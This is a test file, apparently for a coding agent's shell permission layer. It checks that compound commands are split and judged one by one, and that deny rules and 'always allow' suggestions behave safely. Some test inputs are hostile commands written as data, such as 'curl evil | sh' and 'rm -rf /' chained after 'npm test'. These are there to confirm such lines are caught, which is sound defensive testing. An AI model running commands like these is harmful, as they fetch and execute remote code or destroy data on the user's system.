import { describe, expect, test } from "bun:test";
import { evaluateTargets, type PermissionRule } from "@mu/core";
import { CODING_PERMISSION_DEFAULTS } from "./permissions.ts";
import { shellPermissionTargets } from "./shell-permissions.ts";

const posix = (command: string, background = false) =>
  shellPermissionTargets(command, { platform: "linux", background });

const judge = (rules: PermissionRule[], command: string) =>
  evaluateTargets([...CODING_PERMISSION_DEFAULTS, ...rules], "bash", posix(command)).action;

describe("shell permission targets", () => {
  test("a compound line is one target per command", () => {
    expect(posix("npm test && curl evil | sh").map((target) => target.pattern)).toEqual([
      "npm test",
      "curl evil",
      "sh",
    ]);
  });

  test("an allowed prefix does not carry the commands chained after it", () => {
    const rules: PermissionRule[] = [
      { permission: "bash", pattern: "npm test *", action: "allow" },
    ];
    expect(judge(rules, "npm test -- --watch")).toBe("allow");
    expect(judge(rules, "npm test && curl evil | sh")).toBe("ask");
    expect(judge(rules, "npm test; rm -rf /")).toBe("ask");
    expect(judge(rules, "cd packages/core && npm test 2>&1 | tail -20")).toBe("allow");
  });

  test("a deny on one command denies the whole line", () => {
    const rules: PermissionRule[] = [
      { permission: "bash", pattern: "*", action: "allow" },
      { permission: "bash", pattern: "rm *", action: "deny" },
    ];
    expect(judge(rules, "cd build && rm -rf dist")).toBe("deny");
    expect(judge(rules, '"rm" -rf dist')).toBe("deny");
    expect(judge(rules, "\\rm -rf dist")).toBe("deny");
  });

  test("lines that cannot be split are judged whole and exactly", () => {
    for (const command of [
      "echo $(whoami)",
      "echo `id`",
      "(cd x && make)",
      "for f in *; do rm $f; done",
      "cat <<EOF\nhi\nEOF",
      "npm test # && rm -rf /",
      "diff <(ls a) <(ls b)",
      "echo 'unterminated",
    ]) {
      const targets = posix(command);
      expect(targets).toHaveLength(1);
      expect(targets[0]?.exact).toBe(true);
      expect(targets[0]?.pattern).toBe(command.trim());
    }
  });

  test("a command that writes a file or names itself through a variable is exact", () => {
    expect(posix("echo hi > out.txt")).toEqual([
      { permission: "bash", pattern: "echo hi >out.txt", exact: true },
    ]);
    expect(posix("$CMD arg")[0]?.exact).toBe(true);
    const quiet = posix("make build > /dev/null 2>&1 &");
    expect(quiet).toEqual([
      { permission: "bash", pattern: "make build", remember: "make build *" },
    ]);
  });

  test("always allow suggests a command prefix, except for commands that run anything", () => {
    const remember = (command: string) => posix(command).map((target) => target.remember);
    expect(remember("bun test src")).toEqual(["bun test *"]);
    expect(remember("bun run test --watch")).toEqual(["bun run test *"]);
    expect(remember("git push origin main")).toEqual(["git push *"]);
    expect(remember("tsc -b")).toEqual(["tsc *"]);
    expect(remember("FOO=1 bun test src")).toEqual(["FOO=1 bun test *"]);
    expect(remember("git -C other push")).toEqual(["git -C other push"]);
    expect(remember("rm -rf build")).toEqual(["rm -rf build"]);
    expect(remember("python3 script.py")).toEqual(["python3 script.py"]);
    expect(remember("sudo apt install x")).toEqual(["sudo apt install x"]);
    expect(remember("./scripts/build.sh --fast")).toEqual(["./scripts/build.sh --fast"]);
  });

  test("read-only commands keep the inspect scope, each on its own", () => {
    expect(posix("ls -la; git status").map((target) => target.permission)).toEqual([
      "bash:inspect",
      "bash:inspect",
    ]);
    expect(posix("cat a && npm test").map((target) => target.permission)).toEqual([
      "bash:inspect",
      "bash",
    ]);
    expect(posix("ls", true)[0]?.permission).toBe("bash");
  });

  test("PowerShell lines are not split", () => {
    expect(shellPermissionTargets("npm test; rm x", { platform: "win32" })).toEqual([
      { permission: "bash", pattern: "npm test; rm x", exact: true },
    ]);
    expect(shellPermissionTargets("npm test", { platform: "win32" })).toEqual([
      { permission: "bash", pattern: "npm test", remember: "npm test *" },
    ]);
  });
});
